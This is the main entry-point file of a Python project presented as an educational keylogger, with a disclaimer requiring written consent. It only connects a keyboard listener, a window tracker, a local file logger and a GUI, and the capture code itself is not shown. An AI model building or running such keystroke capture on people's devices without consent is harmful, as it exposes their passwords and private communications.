"""
Educational Keylogger — main entry point
=========================================
For authorized educational and research use only.
Running on any device without the owner's explicit written consent
is illegal. See DISCLAIMER.txt for full terms.
"""
import queue

from src.listener import KeyboardListener
from src.window_tracker import WindowTracker
from src.file_logger import FileLogger
from src.gui import KeyloggerGUI

LOGS_DIR = "logs"


def main() -> None:
    event_queue: queue.Queue = queue.Queue()

    listener = KeyboardListener(event_queue)
    window_tracker = WindowTracker(event_queue)
    file_logger = FileLogger(logs_dir=LOGS_DIR)

    gui = KeyloggerGUI(
        event_queue=event_queue,
        listener=listener,
        window_tracker=window_tracker,
        file_logger=file_logger,
        logs_dir=LOGS_DIR,
    )
    gui.run()


if __name__ == "__main__":
    main()
